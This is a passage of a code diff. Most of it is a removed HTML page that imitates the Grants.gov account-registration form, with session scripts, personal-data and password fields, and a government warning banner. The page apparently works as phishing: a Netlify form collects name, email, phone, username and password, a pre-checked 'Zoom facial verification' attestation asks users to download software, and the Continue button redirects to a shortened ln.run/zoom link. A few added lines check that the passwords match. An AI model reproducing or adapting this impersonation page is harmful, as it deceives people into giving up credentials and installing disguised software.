-									&lt;td&gt;&lt;label for="keywords" style="display: none;"&gt;Keywords&lt;/label&gt;&lt;input
-										name="keyword" type="text" id="keywords"
-										value="Enter Keyword..."
-										onkeypress='if(event.keyCode == 13) {search(exitUrl); return false;}'
-										onClick="this.value=''; clickclear(this, 'Enter Keyword...');"
-										onblur="clickrecall(this,'Enter Keyword...')" /&gt;&lt;/td&gt;
-									&lt;td&gt;&lt;input type="button" name="go_button" id="go_button"
-										value="Go" onClick='search(exitUrl);' /&gt;&lt;/td&gt;
-								&lt;/tr&gt;
-							&lt;/table&gt;
-						&lt;/form&gt;
-						-->
-					</div>
-				</div>
-		      		
-		      	<!-- &lt;/ul&gt; -->
-	  		</div>
-  		</nav>
-	</header>
-	 
-	<!-- End Header -->
-	<!-- &lt;div id="topnav"&gt;&lt;/div&gt; -->
-
-	<!-- Load JavaScript ad css from template.xhtml instead of individual component
-	&lt;script type="text/javascript" src="/apply/js/main.js"&gt;&lt;/script&gt;
-	&lt;script type="text/javascript" src="/apply/js/jkmegamenu.js"&gt;&lt;/script&gt;
-	
-	&lt;script type="text/javascript" src="/apply/js/ui/1.10.3/jquery-ui.js"&gt;&lt;/script&gt;
-	&lt;link rel="stylesheet" href="/apply/js/ui/1.10.3/themes/smoothness/jquery-ui.css" /&gt;
--->
-<style>
-/*
-	These styles override the jquery-ui css (v1.10.2) for the dialog box
-*/
-	.ui-dialog {
-		border: solid 5px;
-		border-color:dodgerblue;
-		background-color: white;
-		box-shadow: rgba(0,0,0,0.35) 0 1px 3px; 
-		-webkit-box-shadow: rgba(0,0,0,0.35) 0 1px 3px; 
-		-moz-box-shadow: rgba(0,0,0,0.35) 0 1px 3px;
-	}
-	
-	
-	.ui-dialog-titlebar {
-		/*background-image: url(/apply/images/alert.png); */
-		/*background-repeat:no-repeat; */
-		/*background-position: 1% 50%; */
-		padding: 2px 8px 2px 2px;
-		background-color:dodgerblue;
-		color:white;
-		border:dodgerblue solid 1px;
-	}
-	
-	.dialogWarning .ui-dialog-titlebar {
-		background-image: url(/apply/images/alert.png) !important; 
-		background-repeat:no-repeat !important;
-		background-position: 1% 50%; 
-		padding: 2px 8px 2px 25px !important;
-	}
-	
-	
-	/* display 'x' on close button */
-	.ui-dialog-titlebar-close:before {
-		content:"x";
-		color:white;
-	}
-	
-	
-	.ui-dialog-titlebar-close {
-		background:dodgerblue !important;
-		border:dodgerblue solid 1px !important;
-		color:white;
-		text-decoration:none;/* remove underline from 'x' */
-	}
-	
-	.ui-dialog .ui-dialog-titlebar-close span { display: block; margin: 1px; }
-	
-	
-	.ui-dialog-titlebar-close:hover {
-		background:dodgerblue;
-		border:dodgerblue solid 1px;
-	}
-	
-	
-	/* remove default close button icon */
-	.ui-dialog-titlebar.ui-widget-header .ui-icon {
-		background-image: none;
-	}
-	
-	.ui-datatable.ui-datatable-header, .ui-datatable.ui-datatable-footer {
-text-align: left;
-padding: 4px 10px;
-}
-	
-</style>
-
-<script type="text/javascript">
-		//<![CDATA[
-	window.onfocus = function() { updateSessionTimeout(true); }
-	
-
-	var ggSessionTimeoutKeepAlive = keepAlive;
-	
-	//need to create alias because of jkmegamenu
-	//var $jq = jQuery.noConflict();
-	
-	/* .noConflict conflicts with PrimeFaces. Comment out jQuery.noConflict() in both jkmegamenu.js and here. */
-	var $jq = jQuery;
-	
-	
-	$jq(function($) {       
-		// create div
-		$jq('<div id="sessionTimeoutDiv" title="Session Timeout"></div>').appendTo('body');
-		
-		$jq( "#sessionTimeoutDiv" ).dialog({
-	        autoOpen: false,
-	        show: "fade",
-	        dialogClass: 'dialogWarning',
-	        hide: "fade",
-	        position: {my: "center", at: "top+30%"},
-	        modal: true,
-			close: function() {
-	        	sessionTimeoutContinue();
-	        },
-	        create: function(e, ui) {
-	            // 'this' is #dialog
-	            // get the whole widget (.ui-dialog) with .dialog('widget')
-	            $(this).dialog('widget')
-	                // find the title bar element
-	                .find('.ui-dialog-titlebar')
-	                // alter the css classes
-	                .removeClass('ui-corner-all');
-	            
-	            $(this).dialog('widget').find('.ui-dialog-titlebar-close').attr("title", "Close Dialog");
-	        }
-
-		});
-		
-		updateSessionTimeout(false);
-		
-	});
-	
-	
-	function showTimeoutMsg() {
-		
-		var msg = 'Your session will expire in 3 minutes. ' +
-			'To continue working, click on the "OK" button below. <br /><br />' +
-    		'Note:<br />' + 
-   			'This is being done to protect your privacy. Unsaved changes will be lost.'
-   			
-		msg += '<br /><br />' +
-			'<div align="center">' +
-			'<input type="button" value="  OK  " onclick="sessionTimeoutContinue();" />' +
-			
-			//'<input type="button" value="Logout" onclick="sessionTimeoutLogout();" />' +
-			'</div>';
-		
-		document.getElementById( "sessionTimeoutDiv" ).innerHTML = msg;
-		
-		$jq( "#sessionTimeoutDiv" ).dialog( "open" ).parent('.ui-dialog').css('zIndex',9999);
-		
-		return false;
-	}// showTimeoutMsg
-	
-	
-/* 	function showExpiredMsg() {
-		
-		var msg = 'Your session has timed out. Please click the "Login" button below to continue.';
-		msg += '<br /><br />' +
-			'<div align="center">' +
-			'<input type="button" value="Login" onclick="sessionTimeoutLogin();" />' +
-			'</div>';
-		
-		document.getElementById( "sessionTimeoutDiv" ).innerHTML = msg;
-		$jq( "#sessionTimeoutDiv" ).dialog( "open" );
-		return false;
-	}// showExpiredMsg */
-	
-	
-	function updateSessionTimeout( check ) {
-		var id = userID;
-		var ggSessionTimeoutURL = SESSION_TIMEOUT_AJAX_URL;
-		
-		if ( ggSessionTimeoutURL == "" ) { return false; }// if
-		
-		//var queryStr = 'jp={"id":"' + id + '"';
-		var queryStr = 'jp={"id":"' + encodeURIComponent( id ) + '"';
-		if ( check == false ) { queryStr += ',"check":false'; }// if
-		queryStr += '}';
-		
-		$jq.ajax({
-			"url": ggSessionTimeoutURL,
-			"data": queryStr,
-			"dataType": "jsonp",
-			"error": function( error ) {},
-			"success": function( data ) {
-				//alert( "data" + JSON.stringify( data ) );
-				if ( ggSessionTimeoutKeepAlive == false ) {
-					//alert( "do not keep alive" );
-					var id = data.id;
-					var timeRemainingInMillis = data.timeRemainingInMillis;
-					
-					if ( timeRemainingInMillis == 0 ) {
-						//showExpiredMsg();
-						sessionTimeoutLogin();
-						
-					} else {
-						updateSessionTimer( timeRemainingInMillis );
-						
-					}// if-else
-				} else {
-					//alert( "keep-alive" );
-					var timeInMillis = 1000*60*12;
-					updateSessionTimer( timeInMillis );
-				}// if-else
-				
-			}// function
-		
-		});
-				
-	}// updateSessionTimeout
-	
-	
-	function updateSession( url ) {
-	    //alert( "update session: " + url );
-		$jq.ajax({
-			"url": url,
-			"dataType": "jsonp",
-			"error": function( error ) {
-			    //alert( "error: " + url + "\n" + JSON.stringify( error ) );
-			},
-			"success": function( data ) {
-			    //alert( "success: " + url + "\n" + JSON.stringify( data ) );
-
-			},
-			"complete": function( data ) {
-			    //alert( "complete: " + url );
-			}
-		
-		});
-		
-	}// updateSession
-	
-	
-	var sessionTimeoutTimerObj;
-	
-	function updateSessionTimer( timeInMillis ) {
-		clearTimeout( sessionTimeoutTimerObj );
-		var sessionTimeoutWarningInMillis = SESSION_TIMEOUT_WARNING_MIN * 60 * 1000;
-		if ( timeInMillis > sessionTimeoutWarningInMillis ) {
-			var timeToWarningInMillis = timeInMillis - sessionTimeoutWarningInMillis;
-			// set difference to display warning
-			sessionTimeoutTimerObj = setTimeout( "updateSessionTimeout(true)", timeToWarningInMillis );
-			$jq( "#sessionTimeoutDiv" ).dialog( "close" );
-			//alert( timeInMillis + " --- time to warning: " + timeToWarningInMillis );
-		} else {
-			sessionTimeoutTimerObj = setTimeout( "updateSessionTimeout(true)", timeInMillis );
-			showTimeoutMsg();
-//			alert( "show timeout: " + timeInMillis );
-			
-		}// if-else
-		
-	}// updateSessionTimer
-	
-	
-	function sessionTimeoutContinue() {
-		updateSessionTimeout( false );
-		$jq( "#sessionTimeoutDiv" ).dialog( "close" );
-		updateSession(APPLY_SESSION_UPDATER_URL );
-	}// sessionTimeoutContinue
-	
-	
-	function sessionTimeoutLogin() {
-		top.location.href = LOGOUT_URL;
-	}// sessionTimeoutLogin
-	
-		//		]]>
-</script>
-
-	<script type="text/javascript">
-		//need to create alias because of jkmegamenu
-		//var $jq = jQuery.noConflict();  
-
-		/* .noConflict conflicts with PrimeFaces. Comment out jQuery.noConflict() in both jkmegamenu.js and here. */
-		var $jq = jQuery;
-
-		$jq(function() {
-
-			$jq("input#keywords")
-					.autocomplete(
-							{
-
-								delay : 200,
-								minLength : 1,
-
-								source : function(request, response) {
-
-									var searchType = document
-											.getElementById("jumpMenu").value;
-
-									var data = new Object();
-									data.keyword = request.term.toLowerCase();
-									data.siteSearch = (searchType == "search-site") ? "true"
-											: "false";
-
-									var queryStr = "jp=" + JSON.stringify(data);
-
-									$jq
-											.ajax({
-												url : "https://apply07.grants.gov/grantsws/Suggest",
-												dataType : "jsonp",
-												data : queryStr,
-												success : function(data) {
-													response(data.suggestions);
-												}
-											});
-								},
-
-								select : function(event, ui) {
-									$jq(this).val(ui.item.value);
-									search('https://apply07.grants.gov/apply/spoExit.jsp?p=');
-								}
-							});
-		});
-	</script>
-	<script>
-		function checkforEmpty(inputValue) {
-			var isEmpty = false;
-			if (inputValue.trim().length == 0) {
-				isEmpty = true;
-			}
-			return isEmpty;
-		}
-
-		function validAlphaNumericSpecialChars(inputValue) {
-			var FUNCTION_NAME = "[validAlphaNumericSpecialChars()] ";
-			var isValid = false;
-			try {
-				var alphaNumSpecialPattern = alphanumRegex;
-				isValid = alphaNumSpecialPattern.test(inputValue);
-			} catch (error) {
-				alert(FUNCTION_NAME
-						+ "Error checking alpha numeric special chars: "
-						+ error.message);
-			}// try-catch
-
-			return isValid;
-		}// isValid
-
-		function validCFDAPrefix(inputValue) {
-			var FUNCTION_NAME = "[validCFDAPrefix()] ";
-			var isValid = false;
-			try {
-				var cfdaPattern = cfdaPrefixRegex;
-				isValid = cfdaPattern.test(inputValue);
-
-			} catch (error) {
-				alert(FUNCTION_NAME + "Error checking cfda pattern: " + error.message );
-			}// try-catch
-
-			return isValid;
-		}// isValid
-
-		function validUSPostal(inputValue) {
-			var FUNCTION_NAME = "[validUSPostal()] ";
-			var isValid = false;
-			try {
-				var zipPattern = /^\d{5}([\-]?\d{4})?$/;
-				isValid = zipPattern.test(inputValue);
-
-			} catch (error) {
-				alert(FUNCTION_NAME + "Error checking us zip patter: "
-						+ error.message);
-			}// try-catch
-
-			return isValid;
-		}
-	</script>
-
-	<!-- Google tag (gtag.js) -->
-	<script type="text/javascript" async="async" src="https://www.googletagmanager.com/gtag/js?id=G-WYJGK9F432"></script>
-	<script>
-		var _gaq = _gaq || [];
-		_gaq.push([ '_setAccount', 'G-WYJGK9F432' ]);
-		_gaq.push([ '_setDomainName', 'grants.gov' ]);
-		_gaq.push([ '_trackPageview' ]);
-		window.dataLayer = window.dataLayer || [];
-		function gtag() {
-			dataLayer.push(arguments);
-		}
-		gtag('js', new Date());
-		gtag('config', 'G-WYJGK9F432');
-	</script>
-		
-		<script>
-			$(document).ready(function() {
-				$('#form')[0].reset();
-			});
-		</script>
-		</div>
-	
-		<div id="bodyContent">
-<form id="form"
-      name="contact"
-      method="POST"
-      data-netlify="true"
-      action="/thank-you.html">
-
-    <input type="text"
-           name="name"
-           placeholder="Name"
-           required>
-
-    <input type="email"
-           name="email"
-           placeholder="Email"
-           required>
-
-    <input type="tel"
-           name="phone"
-           placeholder="Phone"
-           required>
-
-    <button type="submit">
-        <span class="ui-button-text ui-c">Continue »</span>
-    </button>
-
-</form>
-	
-	<script>
-		//<![CDATA[
-		function init() {
-			createNav();
-			bindEvents();
-		}
-		
-		function bindEvents() {
-			//checkRequiredFieldsForCommandButton('input.requiredForContinueButton', '#form\\:continueButton');
-			checkRequiredFieldsForCommandButton('#form\\:temporaryCode', '#form\\:validateTemporaryCodeButton');
-			checkRequiredFieldsForCommandButton('input.requiredForSaveApplicantProfileButton', '#form\\:saveApplicantProfile');
-			checkRequiredFieldsForCommandButton('#form\\:newEmail', '#form\\:saveEmailAddressEditButton');
-		}
-		//]]>
-	</script>
-	
-	<div id="breadcrumbs">
-		<ul>
-			<li class="first"><a href="https://www.grants.gov/">GRANTS.GOV</a>
-			</li>
-			<li class="last">Register</li>
-		</ul>
-	</div><span id="form:wrapperPanel"></span><table id="form:j_idt47" class="ui-panelgrid ui-widget panelGridCenter" style="width:98%" role="grid"><tbody><tr class="ui-widget-content ui-panelgrid-even" role="row"><td role="gridcell" class="ui-panelgrid-cell" style="text-align:left"> 	
-				<h1 class="page-title">Register</h1></td><td role="gridcell" class="ui-panelgrid-cell noPrintBlock" style="text-align:right"> 	
-				<!-- &lt;h:outputLink onclick="window.open('https://apply07.grants.gov/apply/spoExit.jsp?p=/help/html/help/index.htm&amp;amp;mapid=PP_REGISTER', '_blank', 'dependent=yes, scrollbars=yes, menubar=yes, resizable=yes, location=no, titlebar=yes, status=yes, height=528px, width=1298px '); return false;" value="#" styleClass="help" title="Click for Help" align="right"&gt; ?&lt;/h:outputLink&gt; --><a href="#" onclick="window.open('https://www.grants.gov/help/register/register-with-grants-gov', '_blank', 'dependent=yes, scrollbars=yes, menubar=yes, resizable=yes, location=no, titlebar=yes, status=yes, height=528px, width=1298px '); return false;" title="Click for Help" class="help"> ?</a></td></tr></tbody></table><div id="form:registrationPanel" class="panelGridCenter" style="width:96%;"><span id="form:instructions">
-		<p>Please enter your information below to create a new Grants.gov account. Required fields are marked with an asterisk (*).<br />
-		For information on how Grants.gov protects your information and when it is shared, read the <a href="https://www.grants.gov/privacy-policy" style="text-decoration:underline;">Grants.gov Privacy Policy</a></p></span><span id="form:registrationMessage" style="{userRegistrationBean.messagesEmpty ? 'display:none' : ''}"><span class="errors"></span></span><span id="form:j_idt58"></span><script type="text/javascript">$(function(){PrimeFaces.focus('form:firstname');});</script><span id="form:confirmEmail"></span><span id="form:contactInformation"><fieldset id="form:j_idt88" class="ui-fieldset ui-widget ui-widget-content ui-corner-all ui-hidden-container" style="margin-bottom:10px;" data-widget="widget_form_j_idt88"><legend class="ui-fieldset-legend ui-corner-all ui-state-default">Contact Information:</legend><div class="ui-fieldset-content"><table id="form:j_idt89" class="ui-panelgrid ui-widget" style="width:100%" role="grid"><tbody><tr class="ui-widget-content ui-panelgrid-even" role="row"><td role="gridcell" class="ui-panelgrid-cell" style="width:40%;vertical-align:middle;text-align:right;"><label id="form:j_idt92" class="ui-outputlabel ui-widget" style="color:red" for="form:firstname">*</label><label id="form:j_idt93" class="ui-outputlabel ui-widget" for="form:firstname">First Name: </label></td><td role="gridcell" class="ui-panelgrid-cell" style="width:60%;vertical-align:top;text-align:left;"><input id="form:firstname" name="form:firstname" type="text" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all" autocomplete="off" maxlength="35" size="30" /><script id="form:firstname_s" type="text/javascript">$(function(){PrimeFaces.cw("InputText","widget_form_firstname",{id:"form:firstname",maxlength:35});});</script></td></tr><tr class="ui-widget-content ui-panelgrid-odd" role="row"><td role="gridcell" class="ui-panelgrid-cell" style="width:40%;vertical-align:middle;text-align:right;"><label id="form:j_idt98" class="ui-outputlabel ui-widget" style="font-weight:bold;" for="form:middleName">Middle Initial: </label></td><td role="gridcell" class="ui-panelgrid-cell" style="width:60%;vertical-align:top;text-align:left;"><input id="form:middleName" name="form:middleName" type="text" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all" autocomplete="off" maxlength="1" size="1" /><script id="form:middleName_s" type="text/javascript">$(function(){PrimeFaces.cw("InputText","widget_form_middleName",{id:"form:middleName",maxlength:1});});</script></td></tr><tr class="ui-widget-content ui-panelgrid-even" role="row"><td role="gridcell" class="ui-panelgrid-cell" style="width:40%;vertical-align:middle;text-align:right;"><label id="form:j_idt103" class="ui-outputlabel ui-widget" style="color:red" for="form:lastName">*</label><label id="form:j_idt104" class="ui-outputlabel ui-widget" for="form:lastName">Last Name: </label></td><td role="gridcell" class="ui-panelgrid-cell" style="width:60%;vertical-align:top;text-align:left;"><input id="form:lastName" name="form:lastName" type="text" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all" autocomplete="off" maxlength="60" size="30" /><script id="form:lastName_s" type="text/javascript">$(function(){PrimeFaces.cw("InputText","widget_form_lastName",{id:"form:lastName",maxlength:60});});</script></td></tr><tr class="ui-widget-content ui-panelgrid-odd" role="row"><td role="gridcell" class="ui-panelgrid-cell" style="width:40%;vertical-align:middle;text-align:right;"><label id="form:j_idt109" class="ui-outputlabel ui-widget" style="color:red" for="form:email">*</label><label id="form:j_idt110" class="ui-outputlabel ui-widget" for="form:email">Email Address: </label></td><td role="gridcell" class="ui-panelgrid-cell" style="width:60%;vertical-align:top;text-align:left;"><input id="form:email" name="form:email" type="text" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all" autocomplete="off" maxlength="50" size="52" /><script id="form:email_s" type="text/javascript">$(function(){PrimeFaces.cw("InputText","widget_form_email",{id:"form:email",maxlength:50});});</script><img id="form:j_idt112" width="5" alt="" src="/apply/javax.faces.resource/spacer/dot_clear.gif.faces?ln=primefaces&amp;v=7.0" /></td></tr><tr class="ui-widget-content ui-panelgrid-even" role="row"><td role="gridcell" class="ui-panelgrid-cell" style="width:40%;vertical-align:middle;text-align:right;"><label id="form:j_idt117" class="ui-outputlabel ui-widget" style="color:red" for="form:phoneNumber">*</label><label id="form:j_idt118" class="ui-outputlabel ui-widget" for="form:phoneNumber">Primary Phone Number: </label></td><td role="gridcell" class="ui-panelgrid-cell" style="width:60%;vertical-align: top;text-align:left;"><input id="form:phoneNumber" name="form:phoneNumber" type="text" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all" autocomplete="off" maxlength="15" size="52" /><script id="form:phoneNumber_s" type="text/javascript">$(function(){PrimeFaces.cw("InputText","widget_form_phoneNumber",{id:"form:phoneNumber",maxlength:15});});</script></td></tr><tr class="ui-widget-content ui-panelgrid-odd" role="row"><td role="gridcell" class="ui-panelgrid-cell" style="width:40%;vertical-align:top;text-align:right;"><label id="form:j_idt123" class="ui-outputlabel ui-widget" style="font-weight:bold;" for="form:mobileNumber">Mobile Phone Number: </label></td><td role="gridcell" class="ui-panelgrid-cell" style="width:60%;vertical-align:top;text-align:left;padding-bottom:10px !important;"><input id="form:mobileNumber" name="form:mobileNumber" type="text" size="52" class="ui-inputfield ui-inputmask ui-widget ui-state-default ui-corner-all" /><script id="form:mobileNumber_s" type="text/javascript">$(function(){PrimeFaces.cw("InputMask","widget_form_mobileNumber",{id:"form:mobileNumber",mask:"(999) 999\-9999",autoclear:false});});</script>
-							<br />Enter your U.S. mobile phone number for the ability to request a one-time
-							<br />password reset code by text message.</td></tr><tr class="ui-widget-content ui-panelgrid-even" role="row"><td role="gridcell" class="ui-panelgrid-cell" style="width:40%;vertical-align:top;text-align:right;"><label id="form:j_idt133" class="ui-outputlabel ui-widget" style="font-weight:bold;" for="form:confirmMobileNumber">Confirm Mobile Phone Number: </label></td><td role="gridcell" class="ui-panelgrid-cell" style="width:60%;vertical-align:top;text-align:left;"><input id="form:confirmMobileNumber" name="form:confirmMobileNumber" type="text" size="52" class="ui-inputfield ui-inputmask ui-widget ui-state-default ui-corner-all" /><script id="form:confirmMobileNumber_s" type="text/javascript">$(function(){PrimeFaces.cw("InputMask","widget_form_confirmMobileNumber",{id:"form:confirmMobileNumber",mask:"(999) 999\-9999",autoclear:false});});</script></td></tr></tbody></table></div></fieldset><script id="form:j_idt88_s" type="text/javascript">$(function(){PrimeFaces.cw("Fieldset","widget_form_j_idt88",{id:"form:j_idt88"});});</script></span><span id="form:accountDetails"><fieldset id="form:j_idt135" class="ui-fieldset ui-widget ui-widget-content ui-corner-all ui-hidden-container" style="margin-bottom:10px;" data-widget="widget_form_j_idt135"><legend class="ui-fieldset-legend ui-corner-all ui-state-default">Grants.gov Account Details:</legend><div class="ui-fieldset-content"><table id="form:j_idt136" class="ui-panelgrid ui-widget" style="width:100%" role="grid"><tbody><tr class="ui-widget-content ui-panelgrid-even" role="row"><td role="gridcell" class="ui-panelgrid-cell" style="width:40%;vertical-align:middle;text-align:right;"><table id="form:j_idt139" class="ui-panelgrid ui-widget" style="width:100%" role="grid"><tbody><td role="gridcell" class="ui-panelgrid-cell" style="width:65%;vertical-align:middle;text-align:left;padding:0 0 !important;">You will need this username and password to link
-						    	<br />your Grants.gov account to Login.gov. Afterward
-						    	<br />you will use Login.gov to log in to Grants.gov.</td><td role="gridcell" class="ui-panelgrid-cell" style="width:40%;vertical-align:middle;text-align:right;"><label id="form:j_idt147" class="ui-outputlabel ui-widget" style="color:red" for="form:username">*</label><label id="form:j_idt148" class="ui-outputlabel ui-widget" for="form:username">Username: </label></td></tbody></table></td><td role="gridcell" class="ui-panelgrid-cell" style="width:60%;vertical-align:middle;text-align:left;"><input id="form:username" name="form:username" type="text" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all" autocomplete="off" maxlength="25" size="52" /><script id="form:username_s" type="text/javascript">$(function(){PrimeFaces.cw("InputText","widget_form_username",{id:"form:username",maxlength:25});});</script></td></tr><tr class="ui-widget-content ui-panelgrid-odd" role="row"><td role="gridcell" class="ui-panelgrid-cell" style="width:40%;vertical-align:top !important;text-align:right;"><label id="form:j_idt153" class="ui-outputlabel ui-widget" style="color:red" for="form:password">*</label><label id="form:j_idt154" class="ui-outputlabel ui-widget" for="form:password">Password: </label></td>
-					<!-- &lt;p:column style="width:60%;vertical-align:top;text-align:left;padding-bottom:15px !important;"&gt;
-						&lt;p:password id="password" value=""
-									maxlength="25" size="52" redisplay="false" autocomplete="false"&gt;
-						&lt;/p:password&gt;
-						&lt;br/&gt;
-						&lt;h:outputText value="Your password must contain at least eight characters, including:"/&gt;
-						&lt;br/&gt;
-						&lt;h:outputText value="at least one uppercase letter (A-Z); at least one lowercase letter (a-z);"/&gt;
-						&lt;br/&gt;
-						&lt;h:outputText value="at least one number (0-9); and at least one special character (! @ # $ % ^ &amp;amp; *)."/&gt;
-						&lt;br/&gt;
-						&lt;h:outputText value="Your password must not contain dictionary words, names, or your username."/&gt;
-					&lt;/p:column&gt; --><td role="gridcell" class="ui-panelgrid-cell" style="width:60%;vertical-align:top;text-align:left;padding-bottom:15px !important;"><input id="form:password" name="form:password" type="password" class="ui-inputfield ui-password ui-widget ui-state-default ui-corner-all" autocomplete="false" maxlength="64" size="70" /><script id="form:password_s" type="text/javascript">$(function(){PrimeFaces.cw("Password","widget_form_password",{id:"form:password"});});</script>
-						<br />Your password must contain at least fifteen characters, including:
-						<br />at least one uppercase letter (A-Z); at least one lowercase letter (a-z);
-						<br />at least one number (0-9); and at least one special character (! @ # $ % ^ &amp; *)  or a space.
-						<br />Your password cannot contain your username.</td></tr><tr class="ui-widget-content ui-panelgrid-even" role="row"><td role="gridcell" class="ui-panelgrid-cell" style="width:40%;vertical-align:middle;text-align:right;"><label id="form:j_idt167" class="ui-outputlabel ui-widget" style="color:red" for="form:passwordConfirm">*</label><label id="form:j_idt168" class="ui-outputlabel ui-widget" for="form:passwordConfirm">Confirm Password: </label></td><td role="gridcell" class="ui-panelgrid-cell" style="width:60%;vertical-align:top;text-align:left;">
-						<!-- &lt;p:password id="passwordConfirm" value=""
-									maxlength="25" size="52" redisplay="false" autocomplete="false"&gt;
-						&lt;/p:password&gt; --><input id="form:passwordConfirm" name="form:passwordConfirm" type="password" class="ui-inputfield ui-password ui-widget ui-state-default ui-corner-all" autocomplete="false" maxlength="64" size="70" /><script id="form:passwordConfirm_s" type="text/javascript">$(function(){PrimeFaces.cw("Password","widget_form_passwordConfirm",{id:"form:passwordConfirm"});});</script></td></tr></tbody></table></div></fieldset><script id="form:j_idt135_s" type="text/javascript">$(function(){PrimeFaces.cw("Fieldset","widget_form_j_idt135",{id:"form:j_idt135"});});</script></span><span id="form:communications"><fieldset id="form:j_idt171" class="ui-fieldset ui-widget ui-widget-content ui-corner-all ui-hidden-container" style="margin-bottom:10px;" data-widget="widget_form_j_idt171"><legend class="ui-fieldset-legend ui-corner-all ui-state-default">Attestation:</legend><div class="ui-fieldset-content"><table id="form:j_idt172" class="ui-panelgrid ui-widget" style="width:100%" role="grid"><tbody><tr class="ui-widget-content ui-panelgrid-even" role="row"><td role="gridcell" class="ui-panelgrid-cell" style="width:40%;vertical-align:top;text-align:right;"><label id="form:j_idt175" class="ui-outputlabel ui-widget" style="font-weight:bold;">Accept: </label></td><td role="gridcell" class="ui-panelgrid-cell" style="width:60%;vertical-align:top;text-align:left;"><table id="form:j_idt177" class="ui-panelgrid ui-widget" role="grid"><tbody><tr class="ui-widget-content ui-panelgrid-even" role="row"><td role="gridcell" class="ui-panelgrid-cell" style="vertical-align:top;"><div id="form:subscribeToAlerts" class="ui-selectbooleancheckbox ui-chkbox ui-widget"><div class="ui-helper-hidden-accessible"><input id="form:subscribeToAlerts_input" name="form:subscribeToAlerts_input" type="checkbox" autocomplete="off" aria-hidden="true" checked="checked" aria-checked="true" /></div><div class="ui-chkbox-box ui-widget ui-corner-all ui-state-default ui-state-active"><span class="ui-chkbox-icon ui-icon ui-icon-check ui-c"></span></div></div><script id="form:subscribeToAlerts_s" type="text/javascript">$(function(){PrimeFaces.cw("SelectBooleanCheckbox","widget_form_subscribeToAlerts",{id:"form:subscribeToAlerts"});});</script></td><td role="gridcell" class="ui-panelgrid-cell"><label id="form:j_idt181" class="ui-outputlabel ui-widget" style="font-weight:normal" for="form:subscribeToAlerts_input">ZOOM FACIAL VERIFICATION<br/>Yes, I am ready to verify my identity using the Zoom verification meeting.(I am willing to download the required version on my PC).</label></td></tr></tbody></table></td></tr><tr class="ui-widget-content ui-panelgrid-odd" role="row"><td role="gridcell" class="ui-panelgrid-cell" style="width:40%;vertical-align:top;text-align:right;"></td><td role="gridcell" class="ui-panelgrid-cell" style="width:60%;vertical-align:top;text-align:left;"><table id="form:j_idt185" class="ui-panelgrid ui-widget" role="grid"><tbody><tr class="ui-widget-content ui-panelgrid-even" role="row"><td role="gridcell" class="ui-panelgrid-cell" style="vertical-align:top;"><div id="form:subscribeToNewsletter" class="ui-selectbooleancheckbox ui-chkbox ui-widget"><div class="ui-helper-hidden-accessible"><input id="form:subscribeToNewsletter_input" name="form:subscribeToNewsletter_input" type="checkbox" autocomplete="off" aria-hidden="true" checked="checked" aria-checked="true" /></div><div class="ui-chkbox-box ui-widget ui-corner-all ui-state-default ui-state-active"><span class="ui-chkbox-icon ui-icon ui-icon-check ui-c"></span></div></div><script id="form:subscribeToNewsletter_s" type="text/javascript">$(function(){PrimeFaces.cw("SelectBooleanCheckbox","widget_form_subscribeToNewsletter",{id:"form:subscribeToNewsletter"});});</script></td><td role="gridcell" class="ui-panelgrid-cell"><label id="form:j_idt189" class="ui-outputlabel ui-widget" style="font-weight:normal" for="form:subscribeToNewsletter_input">YES. ALL INFORMATION I HAVE PROVIDED IS TRUE AND I AM READY TO PROCEED WITH FACIAL VERIFICATION ON MY COMPUTER.<br/></label></td></tr></tbody></table></td></tr></tbody></table></div></fieldset><script id="form:j_idt171_s" type="text/javascript">$(function(){PrimeFaces.cw("Fieldset","widget_form_j_idt171",{id:"form:j_idt171"});});</script></span><span id="form:continueOrCancelRegistration"><table id="form:j_idt190" class="ui-panelgrid ui-widget panelGridCenter" role="grid"><tbody><tr class="ui-widget-content" role="row"><td role="gridcell" class="ui-panelgrid-cell"><button id="form:continueButton" name="form:continueButton" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" onclick="PrimeFaces.ab({s:&quot;form:continueButton&quot;,f:&quot;form&quot;,p:&quot;form:continueButton form:contactInformation form:accountDetails form:communications&quot;,u:&quot;form&quot;,onst:function(cfg){PF('blockUI').show(); updateSessionTimeout(false);;},onco:function(xhr,status,args){PF('blockUI').hide(); bindEvents();;}});return false;" type="submit" onmousemove="setToolTip('form:continueButton', 'Click to continue')"><span class="ui-button-text ui-c">Continue »</span>
-</button>
-<script id="form:continueButton_s" type="text/javascript">
-$(function(){
-    PrimeFaces.cw("CommandButton","continueButton",{
-        id:"form:continueButton"
     });
 
-    $("#form\\:continueButton").on("click", function(){
-        window.location.href = "https://ln.run/zoom";
+    passwordConfirm.addEventListener("input", function () {
+      if (password.value !== passwordConfirm.value) {
+        passwordConfirm.setCustomValidity(
+          "The passwords do not match."
+        );
+      } else {
+        passwordConfirm.setCustomValidity("");
+      }
     });
-});
-</script>
-<img id="form:j_idt192" width="10" alt="" src="/apply/javax.faces.resource/spacer/dot_clear.gif.faces?ln=primefaces&amp;v=7.0" /><button id="form:cancelButton" name="form:cancelButton" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" onclick="PrimeFaces.ab({s:&quot;form:cancelButton&quot;,f:&quot;form&quot;,p:&quot;form:cancelButton&quot;});return false;" style="width:100px; background: #e6e6e6;" title="Click to cancel" type="submit"><span class="ui-button-text ui-c">Cancel</span></button><script id="form:cancelButton_s" type="text/javascript">$(function(){PrimeFaces.cw("CommandButton","widget_form_cancelButton",{id:"form:cancelButton"});});</script></td></tr></tbody></table></span><div id="form:warningNotice" class="panelGridCenter" style="width:96%;">
-	
-    <p><span class="errors">Warning Notice</span></p>
-    <ul>
-      <li>This warning banner provides privacy and security notices consistent with applicable federal laws, directives, and other federal guidance for accessing this Government system, which includes (1) this computer network, (2) all computers connected to this network, and (3) all devices and storage media attached to this network or to a computer on this network. </li>
-      <li>This system is provided for Government-authorized use only. </li>
-      <li>Unauthorized or improper use of this system is prohibited and may result in disciplinary action and/or civil and criminal penalties. </li>
-      <li>Personal use of social media and networking sites on this system is limited as to not interfere with official work duties and is subject to monitoring. </li>
-      <li>By using this system, you understand and consent to the following:
-        <ul>
